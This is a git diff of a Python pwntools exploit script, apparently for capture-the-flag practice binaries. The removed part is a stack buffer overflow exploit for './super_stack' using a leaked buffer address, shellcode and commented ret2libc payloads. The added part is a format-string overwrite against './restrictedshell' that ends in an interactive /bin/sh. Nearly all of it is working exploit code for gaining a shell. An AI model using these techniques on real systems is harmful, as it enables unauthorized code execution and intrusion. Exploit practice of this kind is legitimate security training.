@@ -2,19 +2,13 @@
 from pwn import *
 import sys
 
-binary = "./super_stack"
-elf = context.binary = ELF(binary, False)
-
-#context.log_level  = 'debug'
-libc = elf.libc
-rop = ROP(elf)
-
-#### GDB Script
-script = '''
-b *0x8049243
-c
-'''
-
+# GLOBAL VARIABLES
+binary = None
+elf = None
+libc = None
+rop = None
+script = None
+REMOTE = []
 
 io = None
 r = lambda *a, **k: io.recv(*a, **k)
@@ -31,9 +25,15 @@ slt = lambda *a, **k: io.sendlinethen(*a, **k)
 ia = lambda *a, **k: io.interactive(*a, **k)
 
 def start(*args, **kwargs):
+    global elf, rop, libc
+    elf = context.binary = ELF(binary, False)
+    context.terminal = ["terminator", "-x", "bash", "-c"]
+    context.log_level  = 'debug'
+    libc = elf.libc
+    rop = ROP(elf)
+
     usage = f"{sys.argv[0]} gdb \nor \n{sys.argv[0]} remote"
     # [ip, port]
-    REMOTE = []
     if args:
         arguments = [elf.path]
         arguments.extend(args)
@@ -52,83 +52,31 @@ def start(*args, **kwargs):
         else:
             return process(elf.path)
 
-
 def main():
-    global io
+    global io, script, binary, REMOTE
     #################### 
     ### EXPLOIT CODE ###
     ####################
-    
+    # set binary name
+    binary = "./restrictedshell"
+    #remote address
+    REMOTE = []
+    # set gdb script    
+    script = """
+    continue
+    """
+    # start process | remote process
     io = start()
-    ret = 0x0804900e # ret gadget
-    ru("buf: ")
-    leak = int(rl(), 16)
-    
-    log.success(f"BUFFER LEAK : {hex(leak)}")
-    
-    shellcode = asm(shellcraft.sh())
-    shell_len = len(shellcode)
 
- 
-    libc.address = 0xf7d7c000
-    binsh = next(libc.search(b"/bin/sh"))
-    system = libc.symbols['system']
+    payload = fmtstr_payload(5, {0x804b334:0x804937f })
 
-
-    # stack pivoting
-    #payload = flat(
-    #    0x0,
-    #    system,
-    #    0x08049022, # pop_ebx
-    #    binsh,
-    #    cyclic((108 - (4*4))),
-    #    leak,
-    #    0x08049145, # leave; ret
-    #)
-
-    #offset = 48
-    #payload = flat(
-    #    cyclic(48),
-    #    system,
-    #    0x08049022, # pop_ebx
-    #    binsh,
-    #)
-
-    #payload = flat(
-    #    cyclic(184),
-    #    system,
-    #    0x0,
-    #    binsh
-    #)
-
-    offset =  108 + 4# get correct offset
-    payload = flat(
-        #cyclic(offset),
-        #b'\x90'*10,
-        shellcode,
-        #cyclic((offset - (shell_len + 10))),
-        b'\x90'*(offset - (shell_len)), #+ 10)),
-        #ret,
-        leak
-    )
-
-    log.info(f"Payload : {payload}")
-
-
-    s(payload)
-    #rl()
+    ru("rsh$ ", timeout=1)
+    sl(b"prompt")
+    #sla(b"rsh$ ", b'prompt')
+    ru("Enter new prompt string: ", timeout=1)
+    sl(payload)
+    sl(b"/bin/sh")
     ia()
-
-
-
-    '''
-    # 184 to esp 
-    stack pointer
-     0xffffcfcc
-    '''
-
-    
-
 
 
 
